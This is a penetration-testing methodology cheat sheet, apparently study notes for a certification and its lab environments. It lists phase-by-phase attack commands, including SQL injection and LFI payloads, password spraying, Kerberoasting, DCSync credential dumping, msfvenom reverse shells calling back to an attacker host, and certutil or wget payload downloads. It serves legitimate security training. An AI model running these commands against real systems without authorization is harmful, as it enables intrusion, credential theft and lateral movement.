# Comprehensive Penetration Testing Methodology

This methodology is a rigorous, step-by-step guide synthesized from the CPTS notes and industry best practices. It allows for a repeatable, structured assessment of target systems, ensuring no stone is left unturned.

> **Core Philosophy:** "Distinguish between what we see and what we do not see. There are always ways to gain more information."

---

## Phase 1: Preparation & Setup

Before engaging the target, ensure your environment is optimized for data capture and multitasking.

### 1. Workspace Organization
- **Directory Structure:**
  ```bash
  mkdir -p {target_name}/{nmap,scans,exploits,loot,notes,downloads}
  cd {target_name}
  ```
- **Session Management:** Use `tmux` or `terminator` to manage multiple terminal windows (VPN, Listeners, Scans).
- **Variables:** Export target IP for easy reference: `export IP=10.129.x.x`

### 2. Mental Model (The Layers)
Visualize the target in layers:
1.  **External:** Domains, Subdomains, ASN.
2.  **Perimeter:** Firewalls, IDS/IPS, VPN endpoints.
3.  **Services:** Ports, Versions, Applications.
4.  **Internal:** Active Directory, Trusts, Internal Networks.
5.  **Host:** OS, Processes, Filesystem, Secrets.

---

## Phase 2: Network Enumeration (The Map)

Use **Nmap** to map the attack surface.

### 1. Host Discovery
Identify live hosts.
```bash
# Ping Sweep (Local/VPN)
sudo nmap -sn 10.129.2.0/24 -oA scans/discovery
# FPing (Fast)
fping -asgq 10.129.2.0/24
```

### 2. Port Scanning
Identify open "doors".

- **Quick Scan (Top 1000):** `sudo nmap $IP --top-ports=1000 --open`
- **Full TCP Scan (The Standard):**
  ```bash
  sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA scans/allports
  ```
- **UDP Scan (Don't Skip):**
  ```bash
  sudo nmap -sU -F --top-ports 100 $IP -oA scans/udp_scan
  ```

### 3. Service & OS Detection
Fingerprint the services on open ports.
```bash
# Extract ports from allports.nmap
ports=$(grep open scans/allports.nmap | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
# Deep Scan
sudo nmap -sC -sV -p $ports $IP -oA scans/detailed
```

---

## Phase 3: Service Footprinting & Attacks

Deep dive into every open port.

### FTP (21)
- **Anonymous Login:** `wget -m --no-passive ftp://anonymous:anonymous@$IP`
- **Brute Force:** `hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP`

### SSH (22)
- **Banner Grabbing:** `nc -nv $IP 22`
- **Key Permissions:** `chmod 600 id_rsa`
- **User Enumeration:** (Rare) `nmap -p22 --script ssh-auth-methods $IP`

### SMTP (25)
- **Enumeration:** `smtp-user-enum -M VRFY -U users.txt -t $IP`
- **Open Relay:** `nmap -p25 --script smtp-open-relay $IP`

### DNS (53)
- **Zone Transfer (AXFR):**
  ```bash
  dig axfr domain.htb @$IP
  host -l domain.htb $IP
  ```
- **Enumeration:** `dnsenum --enum domain.htb -f subdomains.txt`

### SMB (139/445)
- **Enumeration:**
  ```bash
  smbclient -N -L //$IP
  smbmap -H $IP
  enum4linux-ng.py $IP -A
  crackmapexec smb $IP --shares -u '' -p ''
  ```
- **Anonymous Connection:** `smbclient //$IP/Share -N`
- **RID Cycling (Find Users):** `crackmapexec smb $IP -u 'guest' -p '' --rid-brute`

### SNMP (161 UDP)
- **Brute Force Strings:** `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP`
- **Walk:** `snmpwalk -v2c -c public $IP`

### Databases
- **MySQL (3306):** `mysql -u root -p -h $IP` (Empty pass?)
- **MSSQL (1433):**
  ```bash
  impacket-mssqlclient User:Pass@$IP -windows-auth
  # Check for xp_cmdshell
  SQL> enable_xp_cmdshell
  SQL> xp_cmdshell whoami
  ```

### NFS (111/2049)
- **Show Exports:** `showmount -e $IP`
- **Mount:** `sudo mount -t nfs $IP:/share ./mnt -o nolock`
- **Root Squashing:** Check if you can write as root? Upload SUID binary.

---

## Phase 4: Web Enumeration (The Deep Dive)

If HTTP/HTTPS is present, it is often the primary vector.

### 1. Reconnaissance
- **Tech Stack:** `whatweb $IP`
- **Headers:** `curl -I http://$IP`

### 2. VHost & Subdomain Discovery
**Crucial:** Always check for virtual hosts.
```bash
# VHost Fuzzing (Host Header)
ffuf -u http://$IP -H "Host: FUZZ.domain.htb" -w subdomains.txt -fs [size_of_default_response]

# Directory Fuzzing
ffuf -u http://$IP/FUZZ -w common.txt -e .php,.txt,.html,.js
gobuster dir -u http://$IP -w common.txt
```

### 3. CMS Specifics
- **WordPress:** `wpscan --url http://$IP --enumerate u,p,t`
- **Joomla:** `joomscan -u http://$IP`

### 4. Common Vulnerabilities
- **LFI:** Test `?page=../../../../etc/passwd`
- **SQLi:** Test `' OR 1=1 -- -` on login forms. Use `sqlmap -u "http://$IP/page?param=val" --batch`
- **RCE:** Check file uploads (bypass extensions), command injection points.

---

## Phase 5: Active Directory Enumeration & Attacks

If connected to a domain environment.

### 1. Initial Enumeration (No Creds)
- **LLMNR/NBT-NS Poisoning:**
  `sudo responder -I tun0 -dwv` (Wait for hashes)
- **Null Session:** `rpcclient -U "" -N $IP` -> `enumdomusers`
- **User Enumeration:** `kerbrute userenum -d domain.local --dc $IP users.txt`

### 2. Password Attacks (With User List)
- **AS-REP Roasting (No-Auth):**
  `impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes`
- **Password Spraying:**
  `crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success`

### 3. Credentialed Enumeration
- **Bloodhound:**
  `bloodhound-python -u 'user' -p 'pass' -ns $IP -d domain.local -c all`
- **Shares:** `smbmap -u user -p pass -d domain -H $IP`
- **LDAP:** `windapsearch.py --dc-ip $IP -u user -p pass --da` (Find Domain Admins)

### 4. Kerberoasting (Request Service Tickets)
- **Impacket:**
  `impacket-GetUserSPNs domain.local/user:pass -dc-ip $IP -request`
- **Crack:** `hashcat -m 13100 hashes.txt rockyou.txt`

### 5. DCSync (Domain Dominance)
If you have Domain Admin or suitable rights:
`impacket-secretsdump domain/user:pass@$IP`

---

## Phase 6: Exploitation & Shells

Turn information into a foothold.

### 1. Payload Crafting (MSFVenom)
- **Windows:** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe`
- **Linux:** `msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf`
- **Web:** `msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > shell.php`

### 2. Shell Stabilization (Linux)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 3. File Transfers
- **Host:** `python3 -m http.server 80`
- **Client (Linux):** `wget http://$LHOST/file`
- **Client (Windows):** `iwr -uri http://$LHOST/file.exe -OutFile file.exe` or `certutil -urlcache -split -f http://$LHOST/file.exe`

---

## Phase 7: Post-Exploitation & Pivoting

### 1. Pivoting (The Tunnels)
- **SSH Dynamic Port Forwarding (SOCKS Proxy):**
  `ssh -D 9050 user@pivot-host`
  Then configure `/etc/proxychains.conf` to `socks4 127.0.0.1 9050`.
- **Chisel (HTTP Tunneling):**
  *Server (Kali):* `./chisel server -p 8000 --reverse`
  *Client (Target):* `./chisel client $LHOST:8000 R:socks`
- **Sshuttle (VPN-like):**
  `sshuttle -r user@pivot-host 172.16.x.x/24`

### 2. Internal Recon
- **Ping Sweep (CMD):** `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
- **Ping Sweep (Bash):** `for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done`

---

## Phase 8: Privilege Escalation

### 1. Linux PrivEsc
- **Sudo Rights:** `sudo -l`
- **SUID Binaries:** `find / -perm -4000 2>/dev/null` (Check GTFOBins)
- **Capabilities:** `getcap -r / 2>/dev/null`
- **Processes:** `ps -aux | grep root` (Look for running services owned by root)
- **Cron Jobs:** `cat /etc/crontab`
- **Automated:** `linpeas.sh`

### 2. Windows PrivEsc
- **User Privileges:** `whoami /priv` (Look for SeImpersonate, SeDebug)
- **Groups:** `whoami /groups` (Backup Operators, DnsAdmins?)
- **Services:** `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\"` (Unquoted Service Paths)
- **Always Install Elevated:** Check Registry.
- **Automated:** `winPEASx64.exe`

---

## Phase 9: Reporting

- **Documentation:** Screenshot every flag and critical step immediately.
- **Cleanup:** Remove uploaded files (`shell.exe`, `linpeas.sh`) from `/tmp` or `C:\Temp`.
